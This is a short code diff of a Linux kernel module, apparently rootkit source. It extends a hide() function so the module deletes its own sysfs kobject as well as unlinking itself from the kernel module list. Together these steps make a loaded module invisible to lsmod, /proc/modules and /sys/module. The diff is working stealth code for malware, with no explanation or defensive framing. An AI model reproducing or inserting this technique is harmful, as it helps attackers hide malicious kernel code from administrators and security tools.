@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: GPL-2.0-only
 /*
  * https://github.com/torvalds/linux/blob/master/include/linux/export.h
+ * https://github.com/MatheuZSecurity
  */
 
 #include <linux/init.h>
@@ -12,6 +13,9 @@ void hide(void);
 
 void hide(void)
 {
+	if (THIS_MODULE->mkobj.kobj.state_initialized)
+		kobject_del(&THIS_MODULE->mkobj.kobj);
+
 	prev_module = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
 }
